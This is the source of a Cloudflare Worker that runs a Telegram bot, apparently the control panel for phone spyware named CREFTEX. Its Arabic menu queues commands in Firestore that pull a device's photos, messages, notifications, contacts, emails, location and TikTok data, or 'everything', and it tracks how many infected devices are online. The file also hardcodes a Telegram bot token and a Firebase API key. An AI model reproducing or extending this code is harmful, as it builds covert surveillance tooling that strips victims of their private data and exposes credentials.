// ═══════════════════════════════════════════
//  CREFTEX Telegram Bot — Cloudflare Worker
// ═══════════════════════════════════════════

const TELEGRAM_BOT_TOKEN = "8965774628:AAHiRk5BzVgGXJOMURMJyNNjHnpDj7MUAjM";
const FIREBASE_API_KEY = "AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg";
const FIREBASE_PROJECT_ID = "hhhxh-5ebe4";

const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const FS_COMMANDS = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/commands`;
const FS_DEVICES = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/devices`;

export default {
    async fetch(request, env, ctx) {
        const url = new URL(request.url);

        if (url.pathname === '/health') {
            return new Response('Bot alive', { status: 200 });
        }

        if (request.method === 'POST') {
            try {
                const update = await request.json();
                ctx.waitUntil(handleUpdate(update));
                return new Response('OK', { status: 200 });
            } catch (e) {
                return new Response('Error: ' + e.message, { status: 200 });
            }
        }

        return new Response('CREFTEX Bot — Running', { status: 200 });
    }
};

async function handleUpdate(update) {
    try {
        const msg = update.message;
        if (!msg) return;

        const chatId = msg.chat.id;
        const text = (msg.text || '').trim();

        if (text === '/start' || text === '/menu' || text === '🏠 القائمة') {
            await sendMenu(chatId);
            return;
        }

        if (text === '/status') {
            const online = await isDeviceOnline();
            const count = await getDevicesCount();
            await sendMessage(chatId,
                online
                    ? `🟢 *الحالة:* الجهاز متصل\n📱 *الأجهزة:* ${count}`
                    : `🔴 *الحالة:* الجهاز غير متصل\n📱 *الأجهزة المسجّلة:* ${count}`);
            return;
        }

        const validCommands = [
            '📸 كل الصور', '📸 آخر 50', '📸 آخر 200',
            '📩 كل الرسائل', '🔔 الإشعارات',
            '👥 جهات الاتصال', '📧 الإيميلات',
            '📊 معلومات الجهاز', '📍 الموقع',
            '🎵 تيك توك', '🚀 جلب كل شي'
        ];

        if (validCommands.includes(text)) {
            await saveCommand(chatId, text);
            const online = await isDeviceOnline();

            if (online) {
                await sendMessage(chatId, `⏳ *تم استلام الأمر*\n\n\`${text}\`\n\nجاري التنفيذ...`);
            } else {
                await sendMessage(chatId,
                    `⚠️ *الجهاز غير متصل حاليًا*\n\n` +
                    `الأمر محفوظ: \`${text}\`\n\n` +
                    `سيُنفَّذ عند عودة التطبيق للعمل.`);
            }
            return;
        }

        await sendMessage(chatId, `❓ أمر غير معروف\n\nاستخدم الأزرار أسفل الشاشة 👇`);
    } catch (e) {
        console.error('handleUpdate err:', e);
    }
}

async function sendMenu(chatId) {
    const keyboard = {
        keyboard: [
            [{ text: '📸 كل الصور' }, { text: '📸 آخر 50' }],
            [{ text: '📩 كل الرسائل' }, { text: '🔔 الإشعارات' }],
            [{ text: '👥 جهات الاتصال' }, { text: '📧 الإيميلات' }],
            [{ text: '📊 معلومات الجهاز' }, { text: '📍 الموقع' }],
            [{ text: '🎵 تيك توك' }],
            [{ text: '🚀 جلب كل شي' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false,
        is_persistent: true
    };

    await fetch(`${TG_API}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: '🎛 *لوحة التحكم — CREFTEX*\n\nاختر العملية من الأزرار أسفل الشاشة 👇',
            parse_mode: 'Markdown',
            reply_markup: keyboard
        })
    });
}

async function sendMessage(chatId, text) {
    await fetch(`${TG_API}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        })
    });
}

async function saveCommand(chatId, text) {
    try {
        const fields = {
            chat_id: { integerValue: String(chatId) },
            text: { stringValue: text },
            time_ms: { integerValue: String(Date.now()) },
            processed: { booleanValue: false }
        };
        await fetch(`${FS_COMMANDS}?key=${FIREBASE_API_KEY}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ fields })
        });
    } catch (e) { console.error(e); }
}

async function isDeviceOnline() {
    try {
        const res = await fetch(`${FS_DEVICES}?key=${FIREBASE_API_KEY}&pageSize=10`);
        const data = await res.json();
        const docs = data.documents || [];
        for (const d of docs) {
            const lastSeen = parseInt(d.fields?.last_seen_ms?.integerValue || '0');
            if ((Date.now() - lastSeen) < 10 * 60 * 1000) return true;
        }
        return false;
    } catch (e) { return false; }
}

async function getDevicesCount() {
    try {
        const res = await fetch(`${FS_DEVICES}?key=${FIREBASE_API_KEY}&pageSize=100`);
        const data = await res.json();
        return (data.documents || []).length;
    } catch (e) { return 0; }
}
